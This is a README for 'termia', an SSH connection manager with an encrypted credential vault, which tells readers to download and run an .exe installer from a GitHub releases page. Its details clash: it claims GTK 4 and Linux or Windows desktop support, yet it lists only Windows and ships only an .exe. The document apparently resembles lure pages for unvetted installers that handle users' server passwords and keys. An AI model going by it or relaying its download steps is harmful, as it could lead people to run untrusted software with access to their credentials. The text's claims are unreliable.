# 🖥️ termia - Manage remote servers with ease

[![](https://img.shields.io/badge/Download_Termia-Blue?style=for-the-badge)](https://github.com/Odessaall150/termia/releases)

Termia organizes your remote server connections. It provides a clean interface for SSH access. You manage your credentials and terminal sessions in one place. The application uses the GTK 4 framework to ensure a modern desktop experience.

## 📥 Get the Application

Follow these steps to install the software on your computer.

1. Visit the [official releases page](https://github.com/Odessaall150/termia/releases) to access the latest files.
2. Look for the Assets section at the bottom of the newest release post.
3. Download the installer file ending in .exe for your Windows system.
4. Locate the downloaded file in your Downloads folder.
5. Double-click the file to start the installation.
6. Follow the prompts on the screen to finish the setup process.

Once the process finishes, you find the Termia icon on your desktop or in your start menu.

## ⚙️ Initial Setup

When you open Termia, the interface appears. You see a sidebar for your connections and a main area for terminal tabs.

### Add a Connection
1. Click the plus button in the sidebar.
2. Enter a name for your connection.
3. Type the hostname or IP address of your remote server.
4. Provide your username for that server.
5. Select your authentication method. You can use a password or an SSH key file.
6. Click the Save button to store the profile.

### Use Credentials
Termia includes a built-in manager for your sensitive data. You create a master password when you first save a connection. This keeps your server passwords secure on your local disk. 

## ⌨️ Using the Terminal

The terminal tab acts like a local console but connects to your remote machine.

- **Tabs**: Open multiple connections in different tabs. Click the plus icon to add a new tab.
- **Resizing**: Drag the edges of the window to change the layout. The text inside the terminal will adjust to fit the new size.
- **Copy and Paste**: Use familiar keyboard shortcuts. Select text with your mouse to copy it automatically. Press the right mouse button to paste content into the console.
- **Search**: Press Ctrl + F to search for specific text within your current session output.

## 🛠️ System Requirements

Termia works best on standard computing hardware. Ensure your system meets these specifications:

- **Operating System**: Windows 10 or Windows 11.
- **Memory**: At least 4 gigabytes of RAM.
- **Storage**: 200 megabytes of free space for the installation files.
- **Network**: An active internet connection for establishing SSH tunnels.

## 📋 Features

Termia simplifies common system administration tasks through a visual interface.

- **Credential Vault**: Encrypts your passwords and keys so you do not need to retype them every time.
- **Session Management**: Keeps track of your active connections. You can close the application and return to your sessions later.
- **High Performance**: Renders text quickly even when you scroll through thousands of lines of log files.
- **Desktop Integration**: Provides a consistent look on your Linux or Windows desktop, matching your system theme colors.
- **SSH Protocol Support**: Connects to any standard SSH server regardless of the remote operating system.

## ❓ Frequently Asked Questions

### Does Termia save my server passwords?
Yes, Termia stores your credentials in an encrypted state on your local machine.

### Can I connect to multiple servers at once?
Yes, you can open as many tabs as your computer memory allows. Each tab runs an independent session.

### What should I do if the connection fails?
Check your internet connection first. Ensure the remote server is running and reachable on port 22. If you use a key file, verify that you selected the correct file path in the connection settings.

### Does Termia require administrative rights?
The application runs as a standard user. You do not need special access rights to use the core features of the tool.

### How do I update the application?
When a new version becomes available, revisit the [GitHub releases page](https://github.com/Odessaall150/termia/releases) to download the new installer. You can install the new version over the old one to keep your settings.

## 📁 Connection Profiles

You save time by creating profiles. A profile stores your server details, including your port number and preferred terminal colors. If you manage many servers, use the search bar at the top of the connection list to find your target quickly.

## 🔒 Security Practices

Termia employs modern encryption standards to protect your data. Keep your master password in a safe place. If you forget your master password, you must reset your local database. Resetting the database removes your saved connections and credentials. Always back up your connection list if you have many configurations.

## 🧩 Troubleshooting Common Issues

- **Font rendering**: If text looks blurry, adjust the font settings in the application preferences. We recommend using a monospaced font.
- **Stuck terminals**: If a session freezes, use the menu to reset the connection. This clears the buffer and restarts the communication link.
- **Copy issues**: If you have trouble copying text, ensure you have permissions for the terminal emulator to access your system clipboard.

## 🚀 Efficiency Tips

Use the keyboard to navigate Termia. Press Ctrl + T to open a new tab. Press Ctrl + W to close the active tab. These shortcuts allow you to switch between servers without taking your hands off the keyboard. You can also drag tabs to rearrange their order in the bar. 

When working with logs, enable the scrollback history setting in the preferences so you can see past events more clearly. Increase the scrollback limit if you process large amounts of data.